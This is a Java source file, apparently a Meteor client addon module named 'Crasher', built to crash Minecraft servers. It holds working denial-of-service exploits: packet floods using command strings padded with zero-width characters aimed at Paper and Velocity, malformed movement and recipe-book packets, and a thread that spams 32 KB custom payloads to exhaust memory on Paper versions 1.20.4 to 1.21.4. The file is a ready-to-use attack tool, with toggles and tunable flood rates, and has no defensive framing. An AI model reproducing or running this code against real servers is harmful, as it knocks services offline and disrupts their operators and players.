package com.x310.clarity.modules;

import com.x310.clarity.Main;
import com.x310.clarity.utils.payload.PaperCustomPayload;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.recipe.NetworkRecipeId;

import java.util.Random;

public class Crasher extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("General");
    private final SettingGroup sgSpam = settings.createGroup("Paper Skill Crash");
    private final SettingGroup sgPos = settings.createGroup("Position Spammer");
    private final SettingGroup sgVelocity = settings.createGroup("Velocity Crash");
    private final SettingGroup oomPaper = settings.createGroup("Paper OOM Crash");
    private final SettingGroup sgDev = settings.createGroup("dev");

    private final Setting<Boolean> disableOnLeave = sgGeneral.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    private final Setting<Boolean> spamCommandExec = sgSpam.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("Spams CommandExecutionC2S packets.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Integer> spamAmount = sgSpam.add(new IntSetting.Builder()
        .name("Amount")
        .description("Number of packets sent per tick.")
        .defaultValue(15)
        .min(1)
        .max(100)
        .sliderMax(100)
        .build()
    );

    private final Setting<Integer> spamBuffer = sgSpam.add(new IntSetting.Builder()
        .name("Buffer")
        .description("Buffer size for spam.")
        .defaultValue(32760)
        .min(1)
        .max(32760)
        .sliderMax(32760)
        .build()
    );

    private final Setting<Boolean> spamPos = sgPos.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("Spams PlayerMoveC2SPackets.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> velocityCrash = sgVelocity.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("Spams server with Velocity packets.")
        .defaultValue(false)
        .build()
    );

    private final Setting<String> velocityServer = sgVelocity.add(new StringSetting.Builder()
        .name("VeloWorld")
        .description("The current \"/server\" you are in.")
        .defaultValue("lobby")
        .build()
    );
    private final Setting<Integer> velocityAmount = sgVelocity.add(new IntSetting.Builder()
        .name("Amount")
        .description("Amount of commands to send every 5 ms.")
        .defaultValue(10000)
        .min(1)
        .max(250000)
        .sliderMax(250000)
        .build()
    );

    private final Setting<Integer> velocityBuffer = sgVelocity.add(new IntSetting.Builder()
        .name("Buffer")
        .description("Buffer length")
        .defaultValue(200)
        .min(1)
        .max(256)
        .sliderMax(256)
        .build()
    );

    private final Setting<Boolean> devCrash = sgDev.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("test")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> paperOOMCrash = oomPaper.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("Spam payload to trigger OutOfMemory for Paper (1.20.4 - 1.21.4).")
        .defaultValue(false)
        .build()
    );

    private final Setting<Integer> paperOOMInterval = oomPaper.add(new IntSetting.Builder()
        .name("Delay")
        .description("Time in ms until next payload is sent.")
        .defaultValue(2)
        .min(2)
        .max(10)
        .sliderMax(10)
        .build()
    );

    private Thread oomThread;
    private volatile boolean oomThreadRunning = false;

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
            stopOomThread();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        ClientPlayNetworkHandler handler = mc.getNetworkHandler();
        if (mc.player == null || handler == null) {
            toggle();
            return;
        }

        if (spamCommandExec.get()) {
            String longString = "skill " + "\u200D".repeat(spamBuffer.get());
            for (int i = 0; i < spamAmount.get(); i++) {
                handler.sendPacket(new CommandExecutionC2SPacket(longString));
            }
        }

        if (spamPos.get()) {
            Random random = new Random();
            double x = mc.player.getX() + random.nextDouble();
            double y = -10000 + random.nextDouble();
            double z = mc.player.getY() + random.nextDouble();
            float yaw = mc.player.getYaw();
            float pitch = mc.player.getPitch();
            handler.sendPacket(new PlayerMoveC2SPacket.Full(x, y, z, yaw, pitch, true, false));
        }

        if (velocityCrash.get()) {
            String longString = "server " + velocityServer.get() + " " + "\u200D".repeat(velocityBuffer.get());
            for (int i = 0; i < velocityAmount.get(); i++) {

                handler.sendPacket(new CommandExecutionC2SPacket(longString));
            }
        }

        if (devCrash.get()) {
            for (int i = 0; i < 19; i++) {
                NetworkRecipeId networkRecipeId = new NetworkRecipeId(Integer.MAX_VALUE);
                handler.sendPacket(new RecipeBookDataC2SPacket(networkRecipeId));
            }
        }
    }

    @Override
    public void onActivate() {
        if (paperOOMCrash.get() && oomThread == null) {
            oomThreadRunning = true;
            oomThread = new Thread(() -> {
                ClientPlayNetworkHandler handler;
                if (mc.player != null && (handler = mc.getNetworkHandler()) != null) {
                    CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(
                        new PaperCustomPayload(
                            new byte[32000])
                    );
                    while (oomThreadRunning) {
                        try {
                            handler.sendPacket(packet);
                            Thread.sleep(paperOOMInterval.get());
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
            oomThread.setName("PaperOOMCrash-Thread");
            oomThread.setDaemon(true);
            oomThread.start();
        }
    }

    @Override
    public void onDeactivate() {
        stopOomThread();
    }

    private void stopOomThread() {
        oomThreadRunning = false;
        oomThread = null;
    }

    public Crasher() {
        super(Main.CATEGORY, "Crasher", "Server Crasher");
    }
}
